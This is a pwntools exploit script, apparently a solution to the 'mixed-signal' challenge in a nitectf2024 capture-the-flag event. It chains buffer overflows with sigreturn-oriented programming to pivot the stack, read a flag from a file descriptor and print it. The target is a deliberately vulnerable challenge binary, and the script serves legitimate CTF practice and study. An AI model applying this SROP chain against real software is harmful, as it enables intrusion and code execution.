from pwn import *
import time
context.arch = 'amd64'

elf = ELF("./chal")
#r = elf.process()
#r = remote('127.0.0.1',1337)
r = remote('mixed-signal.chals.nitectf2024.live',1337, ssl=True)
print(r.recv())

#gdb.attach(r,"""
#    break main
#           """)

time.sleep(15)
rop = ROP(elf)

ret_offset = 16
syscall_ret = rop.find_gadget(['syscall','ret'])[0]

mov_rax_0_ret = 0x4014a2
vuln = 0x004011eb
gift = 0x00401196
new_stack = 0x404100 #skip read got
call_puts = 0x00401267
call_exit0 = 0x00401498

#trigger sifreturn to read next payload to new_stack

frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = new_stack
frame.rdx = 1024
frame.rsp = new_stack
frame.rip = syscall_ret

#0x7ffd95c374f8
#0x7ffc3815ed48
payload = b'A'*15+b'\00'
payload += p64(vuln) # adjust rax
payload += p64(syscall_ret)
payload += bytes(frame)

#with open("payload", 'wb') as f:
#    f.write(payload)
print(payload)
print(len(payload))
r.sendline(payload)
time.sleep(5)
#r.interactive()
payload2=b'a'*15 #syscall rt_sigreturn
print(payload2)
print(len(payload2))
r.send(payload2)
time.sleep(5)
#send the new payload to new stack
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 5
frame.rsi = 0x404500
frame.rdx = 100
frame.rip = syscall_ret

#exit normal to send the result
frame2 = SigreturnFrame()
#frame2.rax = constants.SYS_write
frame2.rdi = 0x404500
#frame2.rsi = new_stack
#frame2.rdx = 2048

frame2.rip = call_puts


payload = p64(vuln) # adjust rax
payload += p64(syscall_ret)
#payload += p64(syscall_ret)
frame.rsp = new_stack + len(payload) + len(bytes(frame))
payload += bytes(frame)
payload += p64(vuln)
payload += p64(syscall_ret)
frame2.rsp = new_stack + len(payload) + len(bytes(frame2))
payload += bytes(frame2)
payload += p64(call_exit0)

print(payload)
#with open("payload", 'wb') as f:
#    f.write(payload)

print(len(payload))
r.sendline(payload)
time.sleep(2)
#r.interactive()
#trigger the second sigreturn for exit(0) 
payload2=b'a'*15 #syscall rt_sigreturn
print(payload2)
print(len(payload2))
r.send(payload2)
#trigger the third sigreturn for exit(0) 
time.sleep(2)
payload2=b'a'*15 #syscall rt_sigreturn
print(payload2)
print(len(payload2))
r.send(payload2)

#r.interactive()
print(r.recv())
print(r.recv())
